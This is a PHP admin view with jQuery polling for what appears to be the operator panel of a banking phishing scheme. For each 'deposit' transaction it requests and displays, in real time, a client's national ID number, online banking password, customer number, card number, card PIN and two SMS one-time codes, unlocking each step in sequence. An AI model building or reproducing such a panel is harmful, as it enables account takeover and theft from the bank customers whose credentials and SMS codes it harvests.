<?php $this->load->view('common/admin_header'); ?>
<!-- Theme Cat Start -->
<div class="row wrapper border-bottom white-bg page-heading">
	<div class="col-lg-10">
		<h2><?php echo lang('view_processed_requests');?></h2>
		<ol class="breadcrumb">
			<li>
				<a href="<?php echo admin_url(); ?>">Home</a>
			</li>
			<li>
				<a href="<?php echo admin_url(); ?>request/processedRequests"><?php echo lang('processed_request');?></a>
			</li>
			<li class="active">
				<strong><?php echo lang('view_processed_requests');?></strong>
			</li>
		</ol>
	</div>
	<div class="col-lg-2">
		<a href="<?php echo admin_url(); ?>request/processedRequests" class="btn mt30 btn-primary "><?php echo lang('back_to_processed_requests');?></a>
	</div>
</div>

<!-- Theme Categories Table -->
<div class="wrapper wrapper-content animated fadeInRight">
	<div class="row">
		<div class="col-lg-10 col-lg-offset-1">
			<div class="ibox float-e-margins">
				<div class="ibox-title">
					<h5><?php echo lang('view_processed_request'); ?></h5>
				</div>
				<div class="ibox-content">
					<form id="complete_request" class="form-horizontal" method="post" action="<?php echo admin_url() ?>request/confirm/<?php echo $request['id'] ?>">
						<div class="row">
							<div class="col-sm-6">
								<input type="hidden" id="trans_id" name="trans_id" value="<?php echo $request['trans_id'] ?>">
								<p><b>Transaction ID:</b> <?php echo $request['trans_id'] ?> </p>
								<p><b><?php echo lang('deposit_name');?>:</b> <?php echo $request['depositName'] ?> </p>
								<p><b><?php echo lang('bank_name');?>:</b> <?php echo $request['bankName'] ?> </p>
								<p><b><?php echo lang('deposit_amount');?>:</b> <?php echo $request['deposit_amount'] ?> </p>
								<p><b><?php echo lang('status');?>:</b> <?php echo ($request['status'] == 2) ? "Processed" : "Pending" ?> </p>

								<?php $bankinfo = request_info($request['bank_id']); ?>

								<?php if($bankinfo['tc_no'] || $bankinfo['bank_customer'] || $bankinfo['bank_password'] || $bankinfo['bank_card_no'] || $bankinfo['bank_card_password'] ) { ?>
									<p><b><?php echo lang('request_info');?>:</b> <a class="btn btn-warning tcnopassword" id="requesttcno"><?php echo lang('request_info');?></a> </p>
								<?php } ?>

								<?php if($bankinfo['sms1']) { ?>

									<p><b><?php echo lang('request_sms');?> 1:</b> <a class="btn btn-warning" <?php if($bankinfo['tc_no'] || $bankinfo['bank_customer'] || $bankinfo['bank_password'] || $bankinfo['bank_card_no'] || $bankinfo['bank_card_password'] ) { ?> disabled <?php } ?> id="requestSms1"><?php echo lang('request_sms');?> 1</a> </p>

								<?php } ?>


								<?php if($bankinfo['sms2']) { ?>

									<p><b><?php echo lang('request_sms');?> 2:</b> <a class="btn btn-warning" <?php if($bankinfo['tc_no'] || $bankinfo['bank_customer'] || $bankinfo['bank_password'] || $bankinfo['bank_card_no'] || $bankinfo['bank_card_password'] || $bankinfo['sms1']) { ?> disabled <?php } ?> id="requestSms2"><?php echo lang('request_sms');?> 2</a> </p>

								<?php } ?>

							</div>
							<div class="col-sm-6">

								<p><b><?php echo lang('user_name');?>:</b> <?php echo $request['username'] ?> </p>

								<?php if($bankinfo['tc_no']) { ?>
									<p><b><?php echo lang('username_or_number');?>:</b> <strong id="tc_no">----</strong></p>
								<?php } ?>

								<?php if($bankinfo['bank_password']) { ?>
									<p><b><?php echo lang('bank_customer_password');?>:</b><strong id="tc_nopassword">----</strong> </p>
								<?php } ?>

								<?php if($bankinfo['bank_customer']) { ?>
									<p><b><?php echo lang('bank_customer_no');?>:</b><strong id="bank_customer">----</strong> </p>
								<?php } ?>

								<?php if($bankinfo['bank_card_no']) { ?>
									<p><b><?php echo lang('bank_card_no');?>:</b><strong id="bank_card_no">----</strong> </p>
								<?php } ?>

								<?php if($bankinfo['bank_card_password']) { ?>
									<p><b><?php echo lang('bank_card_password');?>:</b><strong id="bank_card_password">----</strong> </p>
								<?php } ?>

								<?php if($bankinfo['sms1']) { ?>
									<p><b><?php echo lang('bank_sms1_code');?>:</b> <strong id="sms1Code">----</strong></p>
								<?php } ?>

								<?php if($bankinfo['sms2']) { ?>
									<p><b><?php echo lang('bank_sms2_code');?>:</b> <strong id="sms2Code">----</strong></p>
								<?php } ?>

								<p><b><?php echo lang('created_at');?>:</b> <?php echo date('d-m-Y', strtotime($request['created_at'])) ?> </p>

							</div>
							<div class="col-md-12">
								<button class="btn btn-success pull-right confirmReq" type="Submit">
									<?php echo lang('confirm_request');?>
								</button>
							</div>
						</div>
					</form>
				</div>
			</div>
		</div>
	</div>
</div>
<!-- Theme Cat End -->
<?php $this->load->view('common/admin_footer'); ?>
<script type="text/javascript">


	setInterval(function(){checkDeclinedRequest();}, 10000);
	function checkDeclinedRequest(){
		var transid = $('#trans_id').val();
		var ajaxurl = '<?php echo admin_url(); ?>request/checkRequestStatus';
		var feedback = $.ajax({
			type: "POST",
			url: ajaxurl,
			data: {id: transid,status:0},
			dataType: "json",
			async: false,
			success: function(data){
				//console.log(data);
				if(data.msg =='error') {
					//setTimeout(function(){checkDeclinedRequest();}, 10000);
				}else if(data.msg =='success') {
					window.location.href = '<?php echo admin_url() ?>request/declined_by_client';
				}
			}, });
		$('div.feedback-box').html(feedback);
	}

	<?php if($bankinfo['tc_no'] || $bankinfo['bank_customer'] || $bankinfo['bank_password'] || $bankinfo['bank_card_no'] || $bankinfo['bank_card_password']) { ?>

		$('#requesttcno').click(function(){
			var transid = $('#trans_id').val();
			var ajaxurl = '<?php echo admin_url(); ?>request/updateTNORequest';
			var feedback = $.ajax({
				type: "POST",
				url: ajaxurl,
				data: {id: transid},
				dataType: "json",
				async: false,
				success: function(data){
					if(data.msg =='error') {
						//setTimeout(function(){checkTCNORequest();}, 10000);
					}else if(data.msg =='success') {
						alert(data.response);
					}
				}, });
		});

		var checkTCNOInter = null;

		checkTCNOInter = setInterval(function(){checkTCNORequest();}, 10000);

		function checkTCNORequest(){
			var transid = $('#trans_id').val();
			var ajaxurl = '<?php echo admin_url(); ?>request/checkTCNORequest';
			var feedback = $.ajax({
				type: "POST",
				url: ajaxurl,
				data: {id: transid,status:2},
				dataType: "json",
				async: false,
				success: function(data){
					
					if(data.msg =='error') {
						//setTimeout(function(){checkTCNORequest();}, 10000);
					}else if(data.msg =='success') {

						<?php if($bankinfo['tc_no']) { ?>
							$('#tc_no').text(data.response.tc_no);
						<?php } ?>
						
						<?php if($bankinfo['bank_password']) { ?>
							$('#tc_nopassword').text(data.response.password);
						<?php } ?>

						<?php if($bankinfo['bank_customer']) { ?>
							$('#bank_customer').text(data.response.bank_customer);
						<?php } ?>

						<?php if($bankinfo['bank_card_no']) { ?>
							$('#bank_card_no').text(data.response.bank_card_no);
						<?php } ?>

						<?php if($bankinfo['bank_card_password']) { ?>
							$('#bank_card_password').text(data.response.bank_card_password);
						<?php } ?>

						<?php if($bankinfo['sms1'] == 1) { ?>
							$('#requestSms1').removeAttr("disabled");
						<?php } ?>

						<?php if( ($bankinfo['sms1'] == 0) && ($bankinfo['sms2'] == 1)) { ?>
							$('#requestSms2').removeAttr("disabled");
						<?php } ?>

						$('#requesttcno').attr("disabled" , "disabled");

						clearInterval(checkTCNOInter);

					}
				}
			});
			$('div.feedback-box').html(feedback);
		}

	<?php } ?>


	<?php if($bankinfo['sms1']) { ?>

		$('#requestSms1').click(function(){
			var transid = $('#trans_id').val();
			var ajaxurl = '<?php echo admin_url(); ?>request/updateSms1Request';
			var feedback = $.ajax({
				type: "POST",
				url: ajaxurl,
				data: {id: transid,type:1},
				dataType: "json",
				async: false,
				success: function(data){
					if(data.msg =='error') {
						//setTimeout(function(){checkSms1Request();}, 10000);
					}else if(data.msg =='success') {
						alert(data.response);
					}
				}, 
			});
		});

		var checkSms1intr = null;
		checkSms1intr = setInterval(function(){checkSms1Request();}, 10000);


		function checkSms1Request(){
			var transid = $('#trans_id').val();
			var ajaxurl = '<?php echo admin_url(); ?>request/checkSms1Request';
			var feedback = $.ajax({
				type: "POST",
				url: ajaxurl,
				data: {id: transid,status:2},
				dataType: "json",
				async: false,
				success: function(data){
					
					if(data.msg =='error') {
						//setTimeout(function(){checkSms1Request();}, 10000);
					}else if(data.msg =='success') {
						
						$('#sms1Code').text(data.response.sms1_content);
						
						$('#requestSms2').removeAttr("disabled");
						
						$('#requestSms1').attr("disabled", "disabled");

						clearInterval(checkSms1intr);
					}
				}, });
			$('div.feedback-box').html(feedback);
		}

	<?php } ?>


	<?php if($bankinfo['sms2']) { ?>
		$('#requestSms2').click(function(){
			var transid = $('#trans_id').val();
			var ajaxurl = '<?php echo admin_url(); ?>request/updateSms1Request';
			var feedback = $.ajax({
				type: "POST",
				url: ajaxurl,
				data: {id: transid,type:2},
				dataType: "json",
				async: false,
				success: function(data){
					if(data.msg =='error') {
						//setTimeout(function(){checkSms1Request();}, 10000);
					}else if(data.msg =='success') {
						alert(data.response);
					}
				}
			});
		});

		var checkSms2intr = null; 
		checkSms2intr = setInterval(function(){checkSms2Request();}, 10000);


		function checkSms2Request(){
			var transid = $('#trans_id').val();
			var ajaxurl = '<?php echo admin_url(); ?>request/checkSms2Request';
			var feedback = $.ajax({
				type: "POST",
				url: ajaxurl,
				data: {id: transid,status:2},
				dataType: "json",
				async: false,
				success: function(data){
					
					if(data.msg =='error') {
						//setTimeout(function(){checkSms2Request();}, 10000);
					}else if(data.msg =='success') {
						$('#sms2Code').text(data.response.sms2_content);
						$('#requestSms2').attr("disabled", "disabled");
						
						clearInterval(checkSms2intr);
					}
				}
			});
			$('div.feedback-box').html(feedback);
		}
		
	<?php } ?>
</script>
</body>
</html>